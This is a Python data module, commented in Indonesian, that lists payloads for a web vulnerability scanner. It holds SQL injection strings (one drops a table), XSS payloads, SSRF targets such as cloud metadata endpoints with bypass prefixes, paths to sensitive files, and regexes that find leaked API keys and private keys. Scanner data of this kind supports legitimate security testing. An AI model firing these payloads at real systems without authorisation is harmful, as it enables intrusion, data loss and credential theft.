"""Definisi payload untuk modul scanner."""

# SQL injection
SQLI_ERROR = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' OR '1'='1'--",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE test--",
    "1 AND 1=1",
    "1 AND 1=2",
]

SQLI_TIME = [
    "1'; SELECT pg_sleep(5)--",          # PostgreSQL
    "1 AND pg_sleep(5)--",               # PostgreSQL
    "1' AND pg_sleep(5)--",              # PostgreSQL
    "1 AND SLEEP(5)",                    # MySQL
    "1' AND SLEEP(5)--",                 # MySQL
    "1 AND WAITFOR DELAY '0:0:5'--",     # MSSQL
    "1; WAITFOR DELAY '0:0:5'--",        # MSSQL
]

# XSS
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
]

# SSRF - internal / metadata endpoints yang tidak boleh dijangkau
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/computeMetadata/v1/",  # GCP metadata
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://2130706433/",  # 127.0.0.1 decimal
    "http://0x7f000001/",  # 127.0.0.1 hex
]

# Teknik bypass allowlist host pada SSRF
SSRF_BYPASS_PREFIXES = [
    "@127.0.0.1",
    "127.0.0.1@",
    "localhost@",
    "[::1]",
]

# Parameter redirect yang umum untuk uji open redirect
REDIRECT_PARAMS = [
    "url", "next", "return", "returnUrl", "return_url", "redirect",
    "redirect_url", "redirectUri", "redirect_uri", "callback", "callbackUrl",
    "callback_url", "dest", "destination", "goto", "target", "continue",
    "rurl", "jump", "link", "to",
]

# Parameter yang umumnya menerima URL (kandidat SSRF)
URL_PARAMS = [
    "url", "uri", "link", "src", "src_url", "source", "feed", "host",
    "target", "dest", "destination", "image", "img", "proxy", "load",
]

# Parameter tersembunyi yang sering mengubah perilaku (debug/admin/test)
HIDDEN_PARAMS = [
    "debug", "test", "admin", "administrator", "backup", "restore", "reset",
    "callback", "webhook", "internal", "source", "trace", "verbose", "dry_run",
    "bypass", "override", "force", "check", "validate", "preview", "sandbox",
    "type", "mode", "env", "environment", "key", "password", "token", "secret",
    "access", "action", "method", "format", "export", "download", "template",
    "view", "page", "limit", "offset", "order", "sort", "fields", "include",
    "filter", "query", "search", "role", "permission", "flag", "feature",
]

# Nilai uji untuk hidden param discovery
HIDDEN_PARAM_VALUES = ["1", "true", "debug", "admin", "test", "enabled"]

# Direktori yang sering memiliki listing / sensitif
SENSITIVE_PATHS = [
    "/admin",
    "/admin/",
    "/api",
    "/uploads/",
    "/upload/",
    "/uploads",
    "/files/",
    "/backup/",
    "/backups/",
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.DS_Store",
    "/web.config",
    "/phpinfo.php",
    "/test.php",
    "/info.php",
    "/server-status",
    "/server-info",
    "/vendor/",
    "/node_modules/",
    "/.well-known/security.txt",
    "/robots.txt",
    "/sitemap.xml",
    "/vercel.json",
    "/.htaccess",
    "/wp-config.php",
    "/config.php",
    "/index.php~",
    "/README.md",
    "/package.json",
]

# Pola secret yang dicari di bundle JS
SECRET_PATTERNS = {
    "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret": r"aws_secret_access_key\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}",
    "GitHub Token": r"gh[pousr]_[0-9A-Za-z]{36,255}|github_pat_[0-9A-Za-z_]{20,}",
    "Slack Token": r"xox[baprs]-[0-9A-Za-z-]{10,}",
    "Stripe Key": r"sk_live_[0-9a-zA-Z]{24,}|pk_live_[0-9a-zA-Z]{24,}",
    "JWT": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    "Private Key": r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
    "Firebase": r"AIza[0-9A-Za-z\-_]{35}",
    "SendGrid": r"SG\.[0-9A-Za-z\-_]{20,}\.[0-9A-Za-z\-_]{20,}",
    "Twilio": r"SK[0-9a-fA-F]{32}",
    "Heroku": r"heroku[a-zA-Z0-9]{20,}",
    "npm token": r"//registry\.npmjs\.org/:_authToken=[0-9a-f]{40}",
    "Database URL": r"(?:postgres|mysql|mongodb|redis|amqp)://[^\s\"']+",
}

# Header keamanan yang dinilai pada recon
SECURITY_HEADERS = {
    "Content-Security-Policy": ("CSP", "Pembatasan sumber konten"),
    "Strict-Transport-Security": ("HSTS", "Paksa HTTPS"),
    "X-Frame-Options": ("XFO", "Anti clickjacking"),
    "X-Content-Type-Options": ("nosniff", "Cegah MIME sniffing"),
    "Referrer-Policy": ("Referrer", "Kontrol info referrer"),
    "Permissions-Policy": ("Permissions", "Batasi API browser"),
    "Cross-Origin-Opener-Policy": ("COOP", "Isolasi window opener"),
    "Cross-Origin-Resource-Policy": ("CORP", "Batasi akses resource"),
}

# Indikator stack berdasarkan header/cookie/meta
STACK_INDICATORS = [
    ("server", r"vercel", "Vercel"),
    ("server", r"cloudflare", "Cloudflare"),
    ("server", r"nginx", "Nginx"),
    ("server", r"apache", "Apache"),
    ("server", r"litespeed|openlitespeed", "LiteSpeed"),
    ("server", r"iis", "IIS"),
    ("server", r"openresty", "OpenResty"),
    ("server", r"gunicorn|wsgi", "Gunicorn/WSGI"),
    ("server", r"express", "Express"),
    ("server", r"caddy", "Caddy"),
    ("server", r"parked|sedo", "Parked domain"),
    ("x-powered-by", r"php", "PHP"),
    ("x-powered-by", r"asp\.net", "ASP.NET"),
    ("x-powered-by", r"express", "Express.js"),
    ("x-powered-by", r"django", "Django"),
    ("x-aspnet-version", r".+", "ASP.NET"),
    ("set-cookie", r"PHPSESSID", "PHP (session)"),
    ("set-cookie", r"JSESSIONID", "Java (JSP/Spring)"),
    ("set-cookie", r"ASP\.NET_SessionId", "ASP.NET"),
    ("set-cookie", r"laravel_session|XSRF-TOKEN", "Laravel"),
    ("set-cookie", r"wordpress|wp-settings", "WordPress"),
    ("set-cookie", r"csrftoken|sessionid", "Django"),
    ("set-cookie", r"connect\.sid", "Express"),
    ("x-nextjs-cache", r".+", "Next.js"),
]
